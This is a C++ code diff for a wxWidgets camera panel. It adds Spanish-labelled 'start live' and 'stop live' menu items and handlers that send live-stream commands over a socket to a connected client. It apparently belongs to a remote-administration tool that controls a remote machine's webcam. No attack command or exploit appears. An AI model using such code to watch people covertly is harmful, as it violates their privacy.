@@ -13,7 +13,8 @@ wxEND_EVENT_TABLE()
 wxBEGIN_EVENT_TABLE(panelPictureBox, wxPanel)
 	EVT_CLOSE(panelPictureBox::OnClose)
 	EVT_MENU(EnumCamMenu::ID_SingleShot, panelPictureBox::OnSingleShot)
-	EVT_MENU(EnumCamMenu::ID_StartLive, panelPictureBox::OnLive)
+	EVT_MENU(EnumCamMenu::ID_Iniciar_Live, panelPictureBox::OnLive)
+	EVT_MENU(EnumCamMenu::ID_Detener_Live, panelPictureBox::OnStopLive)
 wxEND_EVENT_TABLE()
 
 panelPictureBox::panelPictureBox(wxWindow* pParent, wxString strTitle, int iCamIndex, wxString strName) :
@@ -26,7 +27,11 @@ panelPictureBox::panelPictureBox(wxWindow* pParent, wxString strTitle, int iCamI
 	wxMenu* camMenu = new wxMenu();
 
 	camMenu->Append(EnumCamMenu::ID_SingleShot, "Captura unica");
-	camMenu->Append(EnumCamMenu::ID_StartLive, "Live");
+	camMenu->AppendSeparator();
+	camMenu->Append(EnumCamMenu::ID_Iniciar_Live, "Iniciar Live");
+	camMenu->Append(EnumCamMenu::ID_Detener_Live, "Detener Live");
+
+	camMenu->Enable(EnumCamMenu::ID_Detener_Live, false);
 
 	menuBar->Append(camMenu, "Camara");
 
@@ -58,18 +63,6 @@ void panelPictureBox::OnDrawBuffer() {
 				error();
 				std::cout << "[X] imageCtrl no esta inicializado\n";
 			}
-			//if (this->imageCtrl) {
-			//	this->GetSizer()->Detach(imageCtrl);
-			//	this->imageCtrl->Destroy();
-			//	this->imageCtrl = nullptr;
-			//}
-
-			//this->imageCtrl = new wxStaticBitmap(this, wxID_ANY, bmp_Obj, wxPoint(0,0), wxSize(img.GetWidth(), img.GetHeight()));
-			/*this->GetSizer()->Add(this->imageCtrl, 1, wxEXPAND | wxALL, 5);
-			this->GetSizer()->Layout();
-			this->GetSizer()->Fit(this);
-			this->Refresh();
-			this->Update();*/
 		}
 	}
 }
@@ -79,6 +72,7 @@ void panelPictureBox::OnDrawBuffer() {
 void panelPictureBox::OnClose(wxCloseEvent& event) {
 	Destroy();
 }
+
 
 void panelPictureBox::OnSingleShot(wxCommandEvent& event) {
 	//Enviar comando para obtener captura sencilla
@@ -90,8 +84,34 @@ void panelPictureBox::OnSingleShot(wxCommandEvent& event) {
 	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
 }
 
+void panelPictureBox::OnStopLive(wxCommandEvent& event) {
+	wxMenuBar* menuBar = this->GetMenuBar();
+	if (menuBar) {
+		menuBar->Enable(EnumCamMenu::ID_Detener_Live, false);
+		menuBar->Enable(EnumCamMenu::ID_Iniciar_Live, true);
+	}
+	//Enviar comando para iniciar live
+	std::vector<std::string> vcTmp = strSplit(this->GetTitle().ToStdString(), ' ', 10);
+	std::string strComando = std::to_string(EnumComandos::CM_Live_Stop);
+	strComando.append(1, CMD_DEL);
+	strComando += vcTmp[vcTmp.size() - 1];
+
+	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+}
+
 void panelPictureBox::OnLive(wxCommandEvent& event) {
-	return;
+	wxMenuBar* menuBar = this->GetMenuBar();
+	if (menuBar) {
+		menuBar->Enable(EnumCamMenu::ID_Detener_Live, true);
+		menuBar->Enable(EnumCamMenu::ID_Iniciar_Live, false);
+	}
+	//Enviar comando para iniciar live
+	std::vector<std::string> vcTmp = strSplit(this->GetTitle().ToStdString(), ' ', 10);
+	std::string strComando = std::to_string(EnumComandos::CM_Live_Start);
+	strComando.append(1, CMD_DEL);
+	strComando += vcTmp[vcTmp.size() - 1];
+
+	p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
 }
 
 panelCamara::panelCamara(wxWindow* pParent):
